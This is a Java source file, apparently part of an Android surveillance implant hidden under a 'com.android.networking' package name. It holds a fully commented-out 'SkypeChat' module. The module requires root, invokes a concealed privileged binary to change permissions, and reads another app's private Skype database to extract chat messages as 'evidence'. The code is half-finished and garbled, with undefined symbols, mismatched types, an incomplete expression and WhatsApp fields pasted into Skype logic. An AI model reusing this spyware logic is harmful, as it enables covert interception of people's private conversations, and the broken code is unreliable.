package com.android.networking.module.submodule;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.io.IOException;
import java.util.ArrayList;
import java.util.Date;
import java.util.Hashtable;

import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteQueryBuilder;
import android.util.Pair;

import com.android.networking.Messages;
import com.android.networking.ProcessInfo;
import com.android.networking.Status;
import com.android.networking.auto.Cfg;
import com.android.networking.conf.ConfModule;
import com.android.networking.db.GenericSqliteHelper;
import com.android.networking.evidence.EvidenceReference;
import com.android.networking.evidence.EvidenceType;
import com.android.networking.evidence.Markup;
import com.android.networking.interfaces.Observer;
import com.android.networking.module.BaseModule;

import com.android.networking.module.chat.ChatMessage;
import com.android.networking.util.ByteArray;
import com.android.networking.util.Check;
import com.android.networking.util.DateTime;
import com.android.networking.util.StringUtils;
import com.android.networking.util.WChar;

//public class SkypeChat extends BaseModule implements Observer<ProcessInfo> {
//	private static final String TAG = "ModuleSkypeChat";
//
//	private static final int PROGRAM_SKYPE = 0x02;
//
//	String pObserving = "skype";
//	Markup markupChat;
//
//	Hashtable<String, Integer> hastableConversationLastIndex = new Hashtable<String, Integer>();
//	
//	@Override
//	public int notification(ProcessInfo b) {
//		// TODO Auto-generated method stub
//		return 0;
//	}
//
//	@Override
//	protected boolean parse(ConfModule conf) {
//		if (Status.self().haveRoot()) {
//			return true;
//		} else {
//			if (Cfg.DEBUG) {
//				Check.log(TAG + " (parse), don't have root, bailing out");
//			}
//			return false;
//		}
//	}
//
//	@Override
//	protected void actualGo() {
//		// TODO Auto-generated method stub
//		
//	}
//
//	@Override
//	protected void actualStart() {
//		// TODO Auto-generated method stub
//		
//	}
//
//	@Override
//	protected void actualStop() {
//		// TODO Auto-generated method stub
//		
//	}
//	
//	private synchronized void readChatMessages() throws IOException {
//		if (Cfg.DEBUG) {
//			Check.log(TAG + " (readChatMessages)");
//		}
//		
//		String account;
//		boolean updateMarkup = false;
//		
//		// k_0=/data/data/com.skype.raider/files
//		String dbDir = Messages.getString("k_0");
//		
//		// k_1=/main.db
//		String dbFile = dbDir + Messages.getString("k_1");
//		
//		// k_2=/shared.xml
//		String confFile = dbDir + Messages.getString("k_2");
//		
//		// changeFilePermission(dbFile,777);
//		// k_6=/system/bin/ntpsvd pzm 777 
//		Runtime.getRuntime().exec(dbDir);
//		Runtime.getRuntime().exec(dbDir + confFile);
//		
//		// Read default user account
//		BufferedReader br = new BufferedReader(new FileReader(dbDir + confFile));
//		
//		// k_3=<Account>
//		String acc = Messages.getString("k_3");
//
//		// k_4=<Default>
//		String def = Messages.getString("k_4");
//		
//		// k_5=</Default>
//		String endDdef = Messages.getString("k_5");
//		
//        String line = br.readLine();
//
//        while (line.indexOf(acc) != -1) {
//            line = br.readLine();
//            
//            // Cannot find a default account                                                                                                                                                             
//            int start = line.indexOf(def);
//            
//            if (start == -1)
//            	return;
//            
//            int end = line.indexOf(endDdef);
//            
//            if (end == -1)
//            	return;
//            
//            account = line.substring(start, end);
//            break;
//        }
//        
//        if (account.length() == 0)
//        	return;
//		
//		// changeFilePermission(dbFile,777);
//		// k_6=/system/bin/ntpsvd pzm 777 
//		Runtime.getRuntime().exec(dbDir + "/" + account);
//		Runtime.getRuntime().exec(dbDir + "/" + account + dbFile);
//		
//		File file = new File(dbFile);
//		
//		if (file.canRead()) {
//			if (Cfg.DEBUG) {
//				Check.log(TAG + " (readChatMessages): can read DB");
//			}
//			
//			GenericSqliteHelper helper = GenericSqliteHelper.openCopy(dbFile);
//			SQLiteDatabase db = helper.getReadableDatabase();
//
//			// retrieve a list of all the conversation changed from the last
//			// reading. Each conversation contains the peer and the last id
//			ArrayList<Pair<String, Integer>> changedConversations = fetchChangedConversation(db);
//
//			// for every conversation, fetch and save message and update markup
//			for (Pair<String, Integer> pair : changedConversations) {
//				String conversation = pair.first;
//				int lastReadIndex = pair.second;
//
//				int newLastRead = fetchMessages(db, conversation, lastReadIndex);
//
//				if (Cfg.DEBUG) {
//					Check.log(TAG + " (readChatMessages): fetchMessages " + conversation + ":" + lastReadIndex
//							+ " newLastRead " + newLastRead);
//				}
//				hastableConversationLastIndex.put(conversation, newLastRead);
//				if (Cfg.DEBUG) {
//					Check.asserts(hastableConversationLastIndex.get(conversation) > 0,
//							" (readChatMessages) Assert failed, zero index");
//				}
//				updateMarkup = true;
//			}
//
//			if (updateMarkup) {
//				if (Cfg.DEBUG) {
//					Check.log(TAG + " (readChatMessages): updating markup");
//				}
//				markupChat.writeMarkupSerializable(hastableConversationLastIndex);
//			}
//
//			db.close();
//		} else {
//			if (Cfg.DEBUG) {
//				Check.log(TAG + " (readChatMessages) Error, file not readable: " + dbFile);
//			}
//		}
//	}
//	
//	/**
//	 * Retrieves the list of the conversations and their last read message.
//	 * @param db
//	 * @return
//	 */
//	private ArrayList<Pair<String, Integer>> fetchChangedConversation(SQLiteDatabase db) {
//		if (Cfg.DEBUG) {
//			Check.log(TAG + " (fetchChangedConversation)");
//		}
//
//		ArrayList<Pair<String, Integer>> changedConversations = new ArrayList<Pair<String, Integer>>();
//
//		// CREATE TABLE chat_list (_id INTEGER PRIMARY KEY AUTOINCREMENT, key_remote_jid TEXT UNIQUE, message_table_id INTEGER)
//		
//		SQLiteQueryBuilder queryBuilderIndex = new SQLiteQueryBuilder();
//		
//		// k_7=Messages
//		queryBuilderIndex.setTables(Messages.getString("k_7"));
//		
//		// queryBuilder.appendWhere(inWhere);
//		// k_8=id
//		// k_9=author
//		// k_10=dialog_partner
//		// k_11=body_xml
//		String[] projection = { Messages.getString("k_8"), Messages.getString("k_9"), Messages.getString("k_10"), Messages.getString("k_11") };
//		Cursor cursor = queryBuilderIndex.query(db, projection, null, null, null, null, null);
//
//		// iterate conversation indexes
//		while (cursor != null && cursor.moveToNext()) {
//			// f.5=key_remote_jid
//			String id = cursor.getString(cursor.getColumnIndexOrThrow(Messages.getString("k_8")));
//			 
//			if (Cfg.DEBUG) {
//				Check.log(TAG + " (readChatMessages): jid : " + id);
//			}
//
//			int lastReadIndex = 0;
//			
//			// if conversation is known, get the last read index
//			if (hastableConversationLastIndex.containsKey(id)) {
//
//				lastReadIndex = hastableConversationLastIndex.get(id);
//				
//				if (Cfg.DEBUG) {
//					Check.log(TAG + " (fetchChangedConversation), I have the index: " + lastReadIndex);
//				}
//			}
//
//			// if there's something new, fetch new messages and update
//			// markup
//			if (lastReadIndex < id.) {
//				changedConversations.add(new Pair<String, Integer>(id, lastReadIndex));
//			}
//
//		}
//		cursor.close();
//		return changedConversations;
//	}
//
//	/**
//	 * Fetch unread messages of a specific conversation
//	 * @param db
//	 * @param conversation
//	 * @param lastReadIndex
//	 * @return
//	 */
//	private int fetchMessages(SQLiteDatabase db, String conversation, int lastReadIndex) {
//		if (Cfg.DEBUG) {
//			Check.log(TAG + " (fetchMessages): " + conversation + " : " + lastReadIndex);
//		}
//		// CREATE TABLE messages (_id INTEGER PRIMARY KEY AUTOINCREMENT, key_remote_jid TEXT NOT NULL, key_from_me INTEGER, key_id TEXT NOT NULL, status INTEGER, needs_push INTEGER, data TEXT, timestamp INTEGER, media_url TEXT, media_mime_type TEXT, media_wa_type TEXT, media_size INTEGER, media_name TEXT, media_hash TEXT, latitude REAL, longitude REAL, thumb_image TEXT, remote_resource TEXT, received_timestamp INTEGER, send_timestamp INTEGER, receipt_server_timestamp INTEGER, receipt_device_timestamp INTEGER, raw_data BLOB)
//		
//		SQLiteQueryBuilder queryBuilderIndex = new SQLiteQueryBuilder();
//		// f.a=messages
//		queryBuilderIndex.setTables(Messages.getString("f_a"));
//		// f.4=_id
//		// f.5=key_remote_jid
//		queryBuilderIndex.appendWhere(Messages.getString("f_5")+" = '" + conversation + "' AND "+ Messages.getString("f_4") +" > " + lastReadIndex);
//		// f.7=data
//		// f_b=timestamp
//		// f_c=key_from_me
//		String[] projection = { Messages.getString("f_4"), Messages.getString("f_5"), Messages.getString("f_7"), Messages.getString("f_b"), Messages.getString("f_c") };
//		
//		// SELECT _id,key_remote_jid,data FROM messages where _id=$conversation AND key_remote_jid>$lastReadIndex
//		Cursor cursor = queryBuilderIndex.query(db, projection, null, null, null, null, Messages.getString("f_4"));
//		
//		ArrayList<ChatMessage> messages = new ArrayList<ChatMessage>();
//		int lastRead = lastReadIndex;
//		while (cursor != null && cursor.moveToNext()) {		
//			int index = cursor.getInt(0); // f_4
//			String data = cursor.getString(2); // f_7
//			Long timestamp = cursor.getLong(3); // f_b
//			boolean from_me = cursor.getInt(4) == 1; // f_c
//			if (Cfg.DEBUG) {
//				Check.log(TAG + " (fetchMessages): " + conversation + " : " + index + " -> " + data );
//			}
//			lastRead = Math.max(index, lastRead);
//			if(data != null){
//				if (Cfg.DEBUG) {
//					Check.log(TAG + " (fetchMessages): " + StringUtils.byteArrayToHexString(data.getBytes()));
//				}
//				messages.add(new ChatMessage(data, new Date(timestamp), from_me));
//
//			}
//		}
//		cursor.close();
//		saveEvidence(conversation, messages);
//		return lastRead;
//	}
//	
//	private void saveEvidence(String conversation, ArrayList<CMessage> messages) {
//		if (Cfg.DEBUG) {
//			Check.log(TAG + " (saveEvidence): " + conversation);
//		}
//		
//		final ArrayList<byte[]> items = new ArrayList<byte[]>();
//		for (CMessage message : messages) {
//			DateTime datetime = new DateTime(message.timestamp);
//
//			String peer = conversation.replaceAll(Messages.getString("f_9"),"");
//			
//			// TIMESTAMP
//			items.add(datetime.getStructTm());
//			// PROGRAM_TYPE
//			items.add(ByteArray.intToByteArray(PROGRAM_WHATSAPP));
//			// FLAGS
//			int incoming = message.from_me? 0x00 : 0x01;
//			items.add(ByteArray.intToByteArray(incoming));
//			// FROM
//			String from = message.from_me? myPhoneNumber : peer ; 
//			items.add(WChar.getBytes(from, true));
//			// FROM DISPLAY
//			String fromdisplay = message.from_me? myPhoneNumber : peer ; 
//			items.add(WChar.getBytes(fromdisplay, true));
//			// TO
//			String to = message.from_me? peer : myPhoneNumber; 
//			items.add(WChar.getBytes(to, true));
//			// TO DISPLAY
//			String todisplay = message.from_me? peer : myPhoneNumber; 
//			items.add(WChar.getBytes(todisplay, true));
//			// CONTENT
//			items.add(WChar.getBytes(message.data, true));
//			items.add(ByteArray.intToByteArray(EvidenceReference.E_DELIMITER));
//			
//			if (Cfg.DEBUG) {
//				Check.log(TAG + " (saveEvidence): " + datetime.toString() + " " + from + " : " + message.data);
//			}
//		}
//
//		EvidenceReference.atomic(EvidenceType.CHATNEW, items);
//	}
//}
